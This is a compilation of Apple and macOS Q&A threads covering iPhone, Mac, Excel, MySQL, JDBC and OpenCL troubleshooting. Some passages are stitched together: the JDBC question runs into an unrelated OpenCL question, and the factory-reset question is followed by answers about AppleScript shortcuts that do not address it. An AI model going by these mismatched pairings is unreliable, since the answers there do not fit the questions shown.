["Q: What is the benefit of macOS dropping support for 32-bit software? It has been hinted at in the past but now we're starting to see solid notice from Apple that it is dropping support for 32-bit macOS programs in the near future. While I can see how this makes sense in the walled garden of iOS, the macOS / OS X environment has always been a bit more flexible in that you could run older software.\nWe dealt with this when Apple dropped PowerPC and Rosetta, but the change of CPU architecture was a bit more obvious since it was apples-to-oranges. However, the difference here is that our x86_64 platforms can still natively run 32-bit x86 code. It is simply a decision by Apple to cut off 32-bit code. Sure, it is great to get rid of old stuff but it also cuts off useful software which might not be maintained anymore. \nI'm curious what benefit actually comes from dropping support for 32-bit software. Is there any measurable performance gain that we would see from there no longer being support for 32-bit apps running next to 64-bit ones? Or is it simply that Apple doesn't want to maintain the 32-bit APIs and support libraries anymore and this is simply cleaning house?\n\nA: Apple's explanation for the transition can be found here: 32-bit app compatibility with macOS High Sierra 10.13.4\n\nAll modern Macs include powerful 64-bit processors, and macOS runs advanced 64-bit apps, which can access dramatically more memory and enable faster system performance. The technologies that define today's Mac experience—such as Metal graphics acceleration—work only with 64-bit apps. To ensure that the apps you purchase are as advanced as the Mac you run them on, all future Mac software will eventually be required to be 64-bit.\n\n", "Q: Can you remove metadata from already sent photos Is there any way to remove the location from photos already texted to someone via iMessage?\n\nA: No. \nOnce they have it, what they have is a completely separate copy, entirely in their control.\n\nA: No, it's not possible to edit any message once it has been sent with iMessage, photos included.\n", "Q: Is there a way to find a dead or offline iPhone? I lost my iPhone 5C. It appears to be dead or offline on Find My iPhone. I have tried to get it to notify me when found and to play a sound, but it stills says those actions are pending. Is there anything else I can do to find this phone? It contains important photos that I don't want to lose.\n\nA: Unfortunately no, all of the methods for locating lost/stolen iOS devices depend on the device being on and connected to the Internet in some way. If it is not on and/or not connected to the Internet in some way then you are just as likely to find the Boy Scout knife you lost when you were 8 the same way.\nNote I am not being facetious here, just trying to be clear.\nIf someone finds the phone and decides to charge it up, it may reconnect to a network somewhere and become findable again. I would log on once a day and see if that has happened. That chance of that happening? Well your guess is as good as mine.\n", "Q: How can I find all the changes I've made to my system via \"defaults write\"? Over time, I've made many tweaks to my OS using defaults write, for example:\ndefaults write NSGlobalDomain KeyRepeat -int 0\ndefaults write NSGlobalDomain AppleShowScrollBars -string \"Always\"\n\nand so on.\nHow can I generate a list of all the non-factory settings I've overridden?\n\nA: It's not possible to distinguish changes made by you with defaults versus changing the setting using the GUI equivalent preference if one exists, since both perform writes to the property list files in the same way.\nTheoretically, the default value shouldn't be written to preference files. Therefore, the only values in ~/Library/Preferences property list files should be ones overridden by you. You will have to investigate these files for the preferences you're using.\nCreate a new user account and open the software you use without making any changes. Diff the contents of ~/Library/Preferences from this user account with your normal user account, such as with Kaleidoscope, to identify changes made to preferences.\n\nA: If you have enough spare space on your disk or an external disk, I suggest you to install the same version of MacOS you are running now on this spare disk space as a \"configuration reference\".\nBring this MacOS \"configuration reference\" to the same upgrade level as your MacOS version you have modified (for my example, let's say you are running Yosemite version 10.10.5).\nThen run:\ndefaults read >/tmp/defaults_MacOS_10.10.5.orig\n\non your MacOS \"configuration reference\", and run:\ndefaults read >/tmp/defaults_MacOS_10.10.5.modified\n\non the MacOS you have modified.\nBring the 1st file onto your working MacOS,\nand compare them with diff:\ndiff defaults_MacOS_10.10.5.{orig,modified} | more\n\nBeware, for some preferences, the content might be huge but not really useful (like windows coordinates).\nNext you will have to navigate through the differences found, and create in a personnal text file, comments to explain why this default was modified. A sort of documented history of your working MacOS.\n", "Q: Is there a limit to how long Xcode will run an app on a device, before \"Finishing\"? I'm trying to run an app on a device for a very long duration (in hours). I thought that Xcode would keep running the app, but it exited several times, saying \"Finished running  on my iPhone.\"\nI'm using a MacBook Pro, so I thought the computer had just gone to sleep (which it had), but now that I'm on adapter power (plugged in, charged to 98%), it just did the same thing and stopped running the app with the same termination message. I need the app to keep running for hours to complete my test. The app will also not be in the foreground the entire time, other apps may be in the foreground as a critical component of these operations.\nHow can I make Xcode continue to run my app under test until I tell it to terminate? \nNote: Xcode did not crash, and there was no indication the mac lost stability. I'm running the latest version as of this writing, Xcode 9.3, on macOS 10.13.4; this is a fresh install of the OS and Xcode (less than a week old), with all security updates applied, and only Xcode and Firefox installed. Xcode and Firefox are both running, with neither showing stability issues.\n\nA: I would submit the app to TestFlight so you aren’t running in a constrained fashion. I know no way to circumvent this timeout but hopefully someone else will edit this post or answer if there is a better way (by hook or by crook if necessary).\n", "Q: How to block downloads from app store? I want to block the iPhone users connected to my home network from downloading apps from the apple app store.I used a similar method to block the auto apple updates but I don't know the server responsible for downloading apps.Does anyone know the Domain address?\n\nA: I finally found out the domain name to block in order to stop installing apps from the app store using tcpdump. The domain name is “aaplimg.com”.Use this address to configure your OpenDNS account.\nI tried this method and it is working great.\n", "Q: Opening multiple outlook windows on macbook Pro I'm running Microsoft Outlook on Mac Book Pro 2015.\nHow do I open multiple windows of it?\nOn windows I could open outlook multiple times.\nCan i do this on Mac?\n\nA: To open multiple windows, simply go to File -> New -> Open New Main Window.\nThis will allow you to open your calendar and your email is separate windows so you can see both at the same time.\n", "Q: Blank rows/ spaces when copying and pasting from Excel to Keynote Chart When I copy from Excel for Mac (version 16.11), and paste into Keynote (version 7.3.1), the formatting jumps every time. This means I have to paste individual cells one by one instead of the whole table of numbers, which is time consuming every time.\nEg 1:\nCopy(CMD+C) this from Excel:\n\nPaste (CMD+V) and get this in Keynote:\n\nEg 2:\nCopy(CMD+C) this:\n\nGet(CMD+V) this:\n\n\nA: Found a simple workaround: just copy paste into Apple's Notes, then paste it into Keynote. Fast and easy.\n", "Q: How to automatically connect Mac's Wi-Fi to iPhone's hotspot I am searching for a solution to automatically connect my MacBook Air to my iPhone hotspot. I don't like to connect manually every time. Is there any way to connect automatically.\nCan I write a shell script file which will try to connect to my Hotspot so that I can add that task to system startup? Does that work? Is there any command to connect to a hotspot?\n\nA: While you cannot connect automatically, you can streamline the process by using these directions from Apple:\n\nUse Instant Hotspot with any Mac, iPhone, iPad, or iPod touch that meets the Continuity system requirements. It\n  works when your devices are near each other and set up as follows:\n  \n  \n*\n  \n*Your iPhone or iPad (Wi-Fi + Cellular) has an activated carrier plan    providing Personal Hotspot service.\n  \n*Each device is signed in to iCloud with the same Apple ID.\n  \n*Each device has Bluetooth turned on.\n  \n*Each device has Wi-Fi turned on.\n  \n  \n  To connect to your Personal Hotspot:\n  \n  \n*\n  \n*On Mac, use the Wi-Fi status menu in the menu bar to choose the name    of the iPhone or iPad providing your Personal Hotspot.\n  \n*On iPad, iPod touch, or even another iPhone, go to Settings > Wi-Fi,    then tap the name of the iPhone or iPad providing your\n  Personal    Hotspot.\n  \n  \n  If you're asked for a password when connecting, make sure that your\n  devices are set up as described above. The Wi-Fi status icon   in the\n  menu bar shows the Personal Hotspot icon  as long as your device\n  remains connected to your Personal Hotspot.\n\n\nA: \nWhen this option \"Allow Others to Join\" is enabled on your phone, MacOS will be able to automatically connect to your iPhones hotspot, if configured to do so in settings, like any other network.\nWithout this setting enabled, MacOS will not connect automatically.\n\nA: After connecting to the iPhone AP you should go in Network Preference and enable \"Automatically join this network\", as shown in the picture. You may also want to click \"Advanced\" and move the AP to change its priority (for example if you are at home you want the Mac to connect to your home's WiFi and not to the phone. So you should put the iPhone AP below the one at home - and/or work if any). \nI have enabled it myself, but for some reasons it didn't seem to stick. Right now, again in \"Advanced\", I have deleted the \"RedPlanet\" AP, applied the changes, connected my MBP to my iPhone again re-enabling the \"Automatically Join\" flag. \nThat should be it, hopefully, unless being a connection from a mobile phone (thus with a data plan) macOS treats it differently (or if it is bugged. It worked randomly in the last couple of days that I enabled it)\n\n\nA: You can't connect to WiFi hotspot, but anyway you can automatically connect to hotspot via cable. \n\n\n*\n\n*Connect iPhone, open Network preferences\n\n*Drag & Drop iPhone USB on the top\n\n*Uncheck Disable unless needed\n\n\nA: In case anyone still interested in this, I wrote a service utilizing shell script to automatically connect to hotspot. Star if you like it.\nhttps://github.com/OnDaShouldersOfGiants/auto-hotspot\n\nA: nice one! I will try to use it. Is there a way to make install easier? I guess for most of us your description is too complicated.\nBut still thank you for your effort!\n", "Q: iphone rings through speaker with earphones connected Just noticed that my iphone 8+ (ios 11.3) rings through speaker even when headphones are connected (works both with earpods and beats solo wireless). Is it a bug or a feature? Is there any way to disable it?\n\nA: This is normal, provided your ringer switch is set to ring.\nSetting the ringer switch to silent will prevent the ringer from sounding from your phone's internal speakers, but not through external Bluetooth or wired speakers/headphones.\n", "Q: Does iOS download iOS updates when using a hotspot? I can see that iTunes and App Store has in Settings to not automatically download updates.\nBut what about iOS updates themselves? The recent iOS 11.3 update for example, is near 800MB, and when I use my main phone as a hotspot, then will my other iPhone silently download the iOS update?\nThe issue is important because the 800MB can cost up to US$12 at $15 per GB such as on Verizon, meaning that to download the update from iOS 11.2.6 to 11.3, it can cost me $12, and if 2 secondary phones, that means US$24 for downloading an update I wasn't aware of.\n\nA: In short, yes. This is how it works:\n\n\n*\n\n*By default iOS does not allow the download of any single file above 100MB in size using your device's cellular/mobile data connection\n\n*When an iOS device is sharing its cellular/mobile data connection as a Personal Hotspot, that hotspot is seen as just another type of internet connection and not as a cellular/mobile data connection\n\n*More specifically, that connection will be seen as either a Wi-Fi interface, Bluetooth interface, or USB interface (depending on your personal hotspot settings)\n\n*Since the second device (i.e. the one connecting to the personal hotspot) is not seeing it as a cellular/mobile data connection, it can download files larger than the 100MB cap allowed on its own cellular/mobile data connection\n\n\nThere are a range of settings within iOS settings that you can use to manage what (incl. individual apps) have access to your cellular/mobile data connection, but these settings will not recognise a Personal Hotspot as anything other than another internet connection.\n\nA: Starting with iOS 13, Apple introduced 'Low Data Mode' which you can configure for Wifi connection, so that your device doesn't download updates, sync Photos, etc. while connected to that network.\n", "Q: Why my macbook 2015 13 inch hums when working with latest Xcode? What may be the cause of this? It happens every time when I build the app on either simulator or device.\nShould i clean sth or reset my harddrive?\nusing High Sierra and Xcode 9.2\nEDIT:\nIt is enough to open Xcode and it hums the same way.\n\nA: The 2015 MacBook Pro uses a Solid State drive, so there's nothing on it that going to \"hum.\"\nIn fact, the only mechanical component in the MacBook Pro (besides the keys and LCD hinge, of course) is the fan.  The fan may be spinning up due to the increased load put on the CPU.  Additionally, it may be clogged with dust or the bearing is simply defective.  \nTry giving it a cleaning and see if the problem goes away.  There's no need to \"reset\" your drive as this would have no effect.\n", "Q: Optimal way to clean Lightning port? Every few months or so, my iPhone 6S becomes unable to charge via the lightning port without jiggling the cable. I am able to fix this problem by using a paper clip to clean pocket lint out of the port. A surprising amount always comes out!\nHowever, I'm always a little nervous about damaging my phone while cleaning the port. Is there a better method?\n\nA: Since Apple doesn't have any official, public-facing support documents for cleaning Lightning ports, you may be straying into opinion territory.\nUsers have reportedly successfully and safely used paperclips, plastic or wooden toothpicks, compressed air, vacuum cleaners with a hose, and even tightly rolled sticky tape. Paperclips and other metal objects reportedly have the ability to damage your iPhone's Lightning port pins and some methods are allegedly better than others.\nWhatever you use is up to you, provided you can maneuver the object in a way that you don't damage the port's pins.\n(Sources include Reddit and Stack Exchange, but answers are anecdotal.)\n", "Q: PCIe SSD swap from MacBook Air 2016 to newer model My sept 16 MacBook Air has overheated and died completely. I have spoken to Apple tech and to computer specialists and apparently the only people who can retrieve data from the ssd card is seagate and another national company that want to charge me more than the laptop (Apple never made an adapter to do this nor do they do data transfer apparently).\nPROBLEM! The laptop died whilst in the middle of writing a very important essay and naturally didn’t have time to back up....so can I swap this ssd card into a newly purchased MacBook Air, retrieve and back up this data quick and bin this ssd for the new one? Is the 2017-2018 MacBook ssd the same as the 2016 models? Will this damage the new machine?\nI’m desperate for my work.\n\nA: The current MacBook Air generation is the early 2015 model. I’m assuming yours is this model but you should enter your serial number from the bottom case on Apple’s warranty lookup to be certain of it before you proceed. \nAccessing the drive is simple and documented by iFixit. In short: have a MacBook screwdriver set handy, open the rear case making sure not to mix up the two shorter screws near the display, disconnect the battery, and remove or insert the SSD by unscrewing it and pulling it up and out of the socket at a slight angle.\nIf you were to buy a new MacBook Air of the same model, the SSD can be swapped. macOS does support booting a drive from one Mac in another Mac. Be aware that the SSDs use a proprietary connector that has changed often between generations and even between different product lines released in the same year. Other Macs such as MacBook Pro 2016/2017 and MacBook (12”) don’t provide the capability to swap drives at all as it’s integrated with the motherboard. \nRegardless of the new Mac you choose, you’re better off attaching both drives and copying data over to the new one. There are adapters from Apple’s proprietary formats to the standardised m.2 format, so you can buy an m.2 USB adapter and another adapter for the SSD. \nConsider selling the old laptop to someone who could make use of it for parts, e.g. a local repair store or on eBay as “for parts”, and dispose of the old drive when you're certain you're done with it. \n\nA: Your data is probably ok, if your Mac does not work, try to open it and take out your SSD. You can then use a USB drive enclosure to connect your SSD to another Mac. You may need to change the permissions on the drive: Get info on it and click the box next to \"Ignore permissions\" and you should be able to extract your data. \n", "Q: How can I find out why I have monthly charges from Apple/iTunes on my credit card? I am being charged monthly and I have bought nothing.\nPURCHASE AUTHORIZED ON 04/10 APL* ITUNES.COM/BI 866-712-7753 CA **************** CARD ****      $9.99\nMy children do not have access to iTunes, my iPhone is the only thing attached to my account. How can I determine the cause and have it stopped?\n\nA: This is a red flag for identity theft\n\n\n*\n\n*It's possible this is a sham credit card merchant who has set their identity field to the same as Apple's - however I would not expect this to be around for 2 months. \n\n*...or the scammer obtained your credit card information and has created their own iTunes account.\n\n*...or they hacked your iTunes account\n\n*...or you signed up for something e.g. Apple Music, and just forgot. \nCheck your iTunes account (if any).  In cases 1 or 2, the charges won't appear, go straight for a credit card chargeback and have the credit card reissued. \nIn case 3, reset your iTunes password and contact iTunes to report the fraud.  \nIn case 3 or 4, do not chargeback, work with Apple to correct it.\nHow/why do scammers exploit iTunes accounts?  It's easier than using Western Union etc.  They use your account to \"gift\" iTunes Store value to other accounts they control.  They get real cash out by trading it or creating a sham app, which they then buy (or do in-app purchases with).\n\nA: Apple has instructions for your situation located at itunes.com/bill:\n\n\n*\n\n*Compare your purchase history with the charges on your credit card and bank statement.\n\n*Check the status of your subscriptions.\n\n*Check all of your Apple IDs.\n\n*If you share your device with others, including young children, learn how to manage your password preferences.\n\n*Anyone who has your Apple ID password is able to make charges to your account. If you have unauthorized charges, change your Apple ID password.\n\n*If you compare your credit card or bank statement to your purchase history and still don't recognize the charge, contact Apple Support. If you don't use your Apple ID to make purchases from the iTunes Store or App Store and see charges on your statement, contact Apple for help with Apple ID account security. If you think you're being billed twice for the same item, it might be a payment authorization hold and not an actual charge. The charge will disappear after your purchase clears.\nIf you have followed all these steps, there may be a possibility that your card number was stolen. Call your bank and dispute the charge. Do note that if this purchase was indeed done on one of your accounts and you do a chargeback, you risk getting locked out of that Apple account.\n", "Q: Configure Swipe between full screen apps Im using my macbookpro with external everything, computer is closed. Im missing the trackpad tho.. Is there a way to configure the trackpad option 'swipe between full screen apps'on my mouse?\nIm using a Corsair Harpoon mouse\n\nA: If your mouse has it's own drivers, much like Razer Synapse, you can assign ^ control+← and ^ control+→, the shortcuts for moving left and right a space, respectively, to certain mouse buttons.\nThis cannot be done natively in macOS Mouse System Preferences. A third-party app/driver is required to do this.\n", "Q: Where are the User and Group definitions stored in High Sierra? I would like to inspect UID and GID numerical values on my High Sierra (10.13.4) server, so that I can coordinate and de-conflict these for use with NFS. Since NFS authenticates at the server level, UIDs and GIDs need to match across the set of machines using the NFS served files, to properly preserve and enforce file and folder permissions.\nTraditionally, Unix machines hold these values in /etc/passwd and /etc/group. These files do not contain the Users and Groups I have added to my system.\nI can inspect individual user's and group's IDs in the System Preferences dialog, but this becomes tedious with many users. I really need to list all the UIDs and GIDs I have previously configured.\nThe man page for chmod(1) does not mention any files. The man page for passwd(1) mentions the non-traditional file /etc/master.passwd but this file similarly lacks my Users and Groups.\nIs there a .plist file somewhere containing these added User and Group definitions?\n\nA: The user and group information on a Mac are stored in Directory Services. That service can bind to external sources and alternate \"local\" sources like NFS, LDAP, ActiveDirectory (LDAP) but by default, unless you opt in to a directory - the user and group database is locally managed.\nYou can find the default local files in /private/var/db/dslocal/nodes/Default/groups and users. They are stored in binary plist format so you need to use /usr/libexec/PlistBuddy or similar to read them.\nAlternately, you can use the easier method of the dscl utlity which allows you to read and change Directory Services entries. Using dscl has the added bonus of reading any of the optional sources in their preference to retrieve this information the same a program would.\n", "Q: Apple ID for iPhone X in Myanmar I ordered an iPhone X from the US. Now I am using it in Myanmar, but I cannot sign in to Apple ID. It asks for an address, phone number and Zip Code in the United States. However I do not have those. What do I need to do to set this up?\n\nA: I like to go to the apple.com page where you buy a phone and tap the OS section. At the bottom of it, there is a small print section making note that not all features are available everywhere. Currently this link is:\n\n\n*\n\n*https://www.apple.com/ios/feature-availability/\nSadly for you and residents of Myanmar - there is not one feature offered in that country. You may have to use your presence in another country to establish an account to use some of the features of the stores and OS that are only available in certain countries.\nStart with the list above and perhaps pick one or two things you really need to do and see if you have any ties to those places to have some legitimacy for establishing an account without fabricating all the details or going to the expense of establishing an address in the US.\n", "Q: iphone and ipad app for emails that supports colors, fonts, etc I can easily bold, italicize, and underline words...but I really want to be able to style my emails.  \nAre there mail apps that:\n*  support colors (mandatory)\n*  free or low cost preferred\nNice to have are:\n* full \"html editor\" built into the email client to change fonts, font size, color, alignment, etc.\nCan someone recommend options?\n\nA: I do this so seldom, that I use another editor to compose what I need and then copy/paste. On the iPad, you have split screen so you can edit in one larger pane and then compose the main in a smaller pane.\nHere are my editing apps of choice:\n\n\n*\n\n*Notes - free and powerful\n\n*Coda - HTML powerhouse\n\n*GoodNotes - more for note taking, but handwriting to text is so awesome, I had to include it\n\n*Drafts - pure writing power\n\n*Pages - also free and powerful\n\n\nEach has different strengths.\n", "Q: Sending Whatsapp message through Automator I have the Whatsapp MacOS app installed.

I made sure the accessibility permissions are available for the Automator in Security and Privacy settings.\nCan you please let me know where I'm going wrong and what I can do to get over this?\n\nA: First you should check if the Whatsapp is also enabled on Privacy Settings. Plus you can try doing that using a Run Applescript action. Something like this:\non run {input, paremeters}\n     tell application \"Whatsapp\"\n          activate\n     end tell\n     tell application \"System Events\"\n          keystroke \"Your message here\"\n     end tell\nend run\n\nAssuming you have the right group/person window already selected.\n", "Q: Can I charge from portable battery on a Late 2013 MacBook Pro? I don't know a lot about the in's and out's of Apple charging devices.\nI have a RavPower 26800 PD USB type C battery, and they are meant to be able to charge a MacBook of various descriptions at least once. I have a similar Anker one but less powerful.\nI have a late 2013 MacBook Pro, so it has what I understand is a MagSafe 2 adapter on it. Its also got what looks like Thunderbolt inputs? There must be a way to charge my MacBook from the USB type C battery's thunderbolt port? Or a converter into the original power input?\n\nA: You would need an inverter to go from USB-C Power Delivery's DC to AC to Apple's Magsafe 2 DC adapter. Going DC to AC and then from AC to DC is inefficient. Also, as far as I can tell, a USB-C PD inverter doesn't exist.\nAs a quick note: MacBooks with Thunderbolt 1 and 2 do not support charging via their Thunderbolt ports, only via Magsafe. Thunderbolt 3 supports USB-C Power Delivery and MacBooks with Thunderbolt 3 / USB-C ports charge exclusively through them.\nLet's consider a new battery that has an AC outlet. RavPower makes a battery pack with an AC socket, but you are hard-pressed to get a single charge for a Magsafe-based laptop. Anker makes the PowerHouse 2, a $500 beast that could charge a recent MacBook Pro 13\" about 6 times. (If The PowerHouse had USB-C PD ports, the number of MacBook recharges would certainly be higher, but wouldn't do you any good, as your Late-2013 MacBook Pro uses Magsafe.)\nThis is assuming that portability is key. If you are in a car (or have a 12V battery that you can clip into), a power inverter could be acceptable.\n\nA: \nCan I charge from portable battery on a Late 2013 MacBook Pro?\n\nNo.\nThe RavPower 26800 PD USB type C battery can be used to charge MacBook's and MacBook Pro's with USB type C port. This include the new Retina MacBook introduced in 2015 and later, and the fourth generation MacBook Pro with Touch Bar and USB C ports introduced in Late 2016 and later.\n", "Q: When I type 'echo $path' in Terminal, I see only a blank line - why? I know I have a $path variable. If I type 'env' or 'set' at the Terminal command line, I can see what's in the $path variable - along with lots of other extraneous stuff. But if I just type 'echo $path', I see only a blank line. What is wrong? I'm El Capitan (10.11.6).\n\nA: The environment variable name are case sensitive. Try typing echo $PATH instead.\n", "Q: cannot associate csv file with excel I have multiple versions of Microsoft Office installed because who knows when I'll have to open some old version of a file that may not work well in newest Office.\nI want csv files to open in the most recent version of excel (~16.12) by default. I press cmd+i with the csv file selected and i tell it to open with the newest version of excel and then i choose Change All... I get a confirmation dialog:\nAre you sure you want to change all similar documents to open with the application “Microsoft Excel.app”?\n\nThis change will apply to all documents with extension “.csv”.\n\nSo I confirm (Continue).\nThen promptly the info window shows the previous/wrong version of Excel.\nupdate: this seems to be resolved, but I honestly have no idea why. Possibly Microsoft or MacOS updates? Possibly (more likely?) the restarts those updates caused?\n\nA: This is an issue if you have two versions of Excel installed at once (like 2011 and 2016) in Mac OS. There is a way to sort this out.\nClick on the file in question and drag it into the icon for the Excel you want to associate it with (like the 2016 icon in your dock). It will now associate all CSV files with excel 2016.\nCaveat: if you have only Excel 2011 open and not 2016 and you click to open that file it will open in 2011. If you have 2011 and 2016 open at the same time it will open in 2016. If you have neither excel open it will open in 2016.\nNote: the Get info will now read the association correctly but do not hit the Open With button as that will re-associate it with 2011.\n\nA: One solution I've observed with this issue is to make sure the newer version of Excel is not running or else it will take over opening the file from the old Excel.\n\nA: I have the same problem. I think it's a Microsoft issue, and it specifically affects people with two versions of MS office. I have Office 2011 and 2016 on my Mac. \nI want downloaded CSV files to automatically open in the 2016 version of Excel. Neither version of the apps is running. In the finder/file info window, I can set a specific file to open in Excel 2016, but when I click on 'change all' then accept the 'are you sure..' message, it reverts to the older version of Excel. \nEven if I set it for an individual file then double-click on the file, it doesn't open in Excel 2016. The error message says \"“[my-file-name].csv” can’t be opened because it is from an unidentified developer. Your security preferences allow installation of only apps from the App Store and identified developers.\" \nSo a CSV file is being treated as an application. See https://excel.uservoice.com/forums/304933-excel-for-mac/suggestions/33845770-in-high-sierra-csv-files-are-being-treated-like\n\nA: You definitely got a different instance of Excel somewhere in your system. Here’s how you make sure you open all your CSVs with the desired versiоn:\nstep 1: [ctrl]-tap any CSV file in finder, then highlight “open with” and press [option] as well (notice how “open with” turns into “always open with”. Now, while still holding those keys choose “Other...” from the drop down menu, navigate to the exact instance of the app and Choose that certain app bundle you want to open CSVs with After it opens your file and you are happy with the result, focus that CSV of yours in Finder and press Cmd+I. in the file info panel you’ll see that this particular file is opened by whatever app you chose for it by default. Now, there’s a self explanatory “Open with” section there, that lets you “Use that app to open all docs like that one” (meaning, all CSV files in your case). \nThe catch here is to choose exactly the app you want to open youb CSVs with. Hence, not choosing an app in “Always With” menu, but navigating to the exact instance of the app \n", "Q: Cannot start MySQL - server quit \"w/o updating PID file\" (PID file missing) I have been researching this problem for two days, and I know there are many other posts about it. But the solutions are always \"fix the permissions\". That does not solve it for me. I have recursively changed the permissions on the symbolic and original directory trees to 777 and I still get the error. Not only is the PID file not being updated, but the error file is not being written either, though the error message in Terminal when I try to start MySQL says that it is.

Apache is enabled and working, and PHP is enabled and working. Both are the versions that came pre-installed. MySQL is v5.7.21. I've removed and reinstalled it 3 times now. This version does not come with a configuration file.\nShould I try an older version of MySQL?? \nDoes anyone have an answer to this problem?\n\nA: I solved it! When I finally got it to write an error log (needed to fix the permissions for that) and looked inside the error log, I saw it was missing the symbol _clock_gettime(). When I googled that, I discovered MacOS didn't add that symbol until OSX 10.12, and I'm running 10.11 (so as not to break Dreamweaver CS6).\nI uninstalled MySQL 5.7.21 and looked for the latest version of MySQL that supported El Capitan (10.11), which turned out to be 5.7.16. I installed that, and now it's running fine.\n", "Q: Is there a modern browser for iOS 10.3.3 capable of supporting ES6+ Javascript? I have some iPads I'd like my staff to use. However, these are 4th generation iPads, so the latest iOS I'm able to install on them is v10.3.3. However, the website they need to access requires a more modern browser than the built-in Safari.\nWe tried downloading the Chrome app, but it seems the Chrome app is using the Safari engine.\nIs there any way to use a modern browser (one that supports ES6+ Javascript) on iOS 10.3.3?\n\nA: From what little I know about ECMAScript Safari on iOS (which all browsers must use for rendering web pages, as @Mark pointed out in his comment) some things are supported but many are not. And your guess is as good as anyone's as to why that is the case (not to mention off-topic here).\nSo you are likely out of luck for full ECMAScrip support on iOS unless you want to go the jailbreak route. We can't help with that and I don't know if there is a browser for jailbroken iOS devices that does support ECMAScript.\n\nA: As far as I know, not currently.\nAccording to this ES6 compatibility table, the only iOS browser supporting this is Safari in iOS 11 (which supports 99% of the ES6 implementation).\nIt's not clear though how often the above table is updated, or whether it would include other browsers when they offer support for ES6+ on iOS (I note they only list Safari for iOS and no other browser).\nSince there are many browsers available for iOS and most of them are regularly updated, it would be worth downloading a few of them and updating regularly to see if any of them support ES6+ in future. \nAs a minimum I would continue to keep an eye on Chrome, Firefox and even Microsoft Edge (which even supports iOS 9) in case they offer support. However, it would be worth keeping an eye on Opera and Dolphin as well.\n[EDIT]\nJust a minor clarification. The reason I am recommending that you download and keep an eye on other browsers is that their developers may opt to make them still compatible with earlier devices, even though at their core they're still using the Webkit engine. In other words, while the version of Safari using the latest Webkit only works on iOS 11 or above, there's nothing stopping another browser using the latest Webkit being compatible with iOS 10, etc.\n\nA: I just tried Dolphin on my Mom’s 4th-generation iPad, iOS 10.3.3, and Dolphin was able to open Facebook, which has just started marking Safari as “unsupported” and limiting what was searchable.\nI have yet to see how it does with AOL mail, which has recently been problematic through the Mail icon in the dock (requiring a special AOL-generated password), but had been O.K. on Safari (though what used to appear as the desktop version when going through Safari also changed recently).  Just checked; it has the new iPad look, but was able to get current mail, which the Mail program was not.\nThanks for helping keep Mom’s iPad useful; hope our experiences help others!\n", "Q: Are file permissions on macOS cryptographically enforced? Are permissions set in the 'Get info' screen when right clicking on a file enforced cryptographically? If not, how are they enforced? Could anyone, for example, boot of a live OS on a USB stick and edit file permissions?\n\nA: The file permissions are only enforced by the operating system. If you boot from another OS (where you have root user access), you can read anything. \nOf course, if the disk is encrypted (research Full Disk Encryption), then you would need the key to decrypt it before you could mount it. On a Mac, the disk encryption key is typically protected by the users password and decryption is handled during login. \n\nA: Filesystem permissions are not cryptographically enforced. On top of that, no general purpose OS currently has an implementation that would allow you to do this.\nIf you gain access to a filesystem on a machine where you are in control, you will always be able to read, write and modify at will. Keep in mind that gaining access means you need to be able to physically interface with the system and have access to unencrypted content. On-disk encryption for removable disks would prevent you from accessing or manipulating the data, but that is outside of the scope of the filesystem.\n", "Q: \"Installing\" MySQL JDBC .jar file for MATLAB Goal: \"install\" JDBC drivers for MATLAB to use\nThis article indicated that one can put the JDBC driver .jar file in:\n/Library/Java/Extensions/\n\n.bashrc and .bashrc_profile were configured with CLASSPATH\nexport CLASSPATH=\"/Library/Java/Extensions/\"\n\nCommand Line tests:\nUsers-MacBook-Air:~ user$ ls -l $CLASSPATH\ntotal 3936\n-rw-r--r--@ 1 user  wheel  1004840 Feb 26 13:28 mysql-connector-java-5.1.46-bin.jar\n-rw-r--r--@ 1 user  wheel  1004838 Feb 26 13:28 mysql-connector-java-5.1.46.jar\nUsers-MacBook-Air:~ user$ echo $CLASSPATH\n/Library/Java/Extensions/\n\nQuestions\n\n\n*\n\n*Is there any other steps I need to perform to install the JDBC driver?\n\n*How can I test from the command line that JAVA can 'see' the JDBC driver?\n\n*Is it enough to have the .jar files on MATLAB's javaclasspath?\n\n\nSYMPTOM\nMATLAB is unable to open up a database connection to MySQL because no suitable driver found.

I am working on writing OpenCL programs running on a MacBook Pro with built-in Nvidia GPU. I know that OpenCL kernels can run on the CPU, or the integrated Intel GPU. But if I want to configure it to run on the Nvidia GPU, do I need to install CUDA and other Nvidia stuff? Thanks!\n\nA: No, you do not. OpenCL and Metal will run automatically on the Nvidia GPU. If you want to take advantage of Nvidia's CUDA architecture (which I highly recommend for software that takes advantage of it, like the Adobe CC suite), you need to install the CUDA driver. You do not need to install the Nvidia web driver because your machine has a built-in Nvidia card (the driver is built-in to MacOS).\n\nA: If you want to use CUDA on High Sierra, you may well have to install both CUDA and the nVidia Web Drivers.  On older versions of MacOS you only need to install CUDA.  Apple rewrote the DisplayServer to use Metal for High Sierra, which is possibly the cause.\n(I say 'may well', because this has certainly been my experience on a 2013 rMBP with a GT650M).\n", "Q: macOS fails to reinstall when trying to factory reset I have a Early 2011 MacBook Pro and I've been wanting to give it away (as it is acting up) so I factory reset it.

If you chose ‘no input’, your service will be under General, otherwise it will be under the type of data you chose as input.\nSet a shortcut to activate the service.\n\n\nA: It sounds like the best option would be to use the keyboard to launch your AppleScript app.\nIf it is an actual AppleScript Application, you could launch it with Spotlight (by invoking Spotlight via ⌘Space). If it is just an .applescript or .scpt file, you could use a third party launcher such as LaunchBar or Alfred (which are basically Spotlight on steroids), or you could use the very versatile Keyboard Maestro.\n", "Q: Why is an application running so slowly when started with launchctl? I've written an application in C++, using OpenGL and Cinder. When I launch the app file from the Finder, it runs nice and smoothly at 60FPS. However, when I launch it using launchctl load the performance is terrible, the UI is sluggish and in general it runs at about half the desired FPS.\nI'd like to use launchctl to keep the application alive in the event that it crashes or needs to restart for content updates. I've read through this tutorial: http://www.launchd.info/ and found some configuration settings that might be useful, namely Data, MemoryLock, NumberOfProcesses, ResidentSetSize & Stack, but I'm not sure what values to set these at, or if they are even useful. \nOne interesting note, is that I've noticed that in the Activity Monitor, that the CPU usage is much lower when using launchctl. \nHere is my current plist file.\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\n  <key>Label</key>\n  <string>PROCESS_ID</string>\n\n  <key>RunAtLoad</key>\n  <true/>\n\n  <key>KeepAlive</key>\n  <true/>\n\n  <key>ThrottleInterval</key>\n  <integer>30</integer>\n\n  <key>Program</key>\n  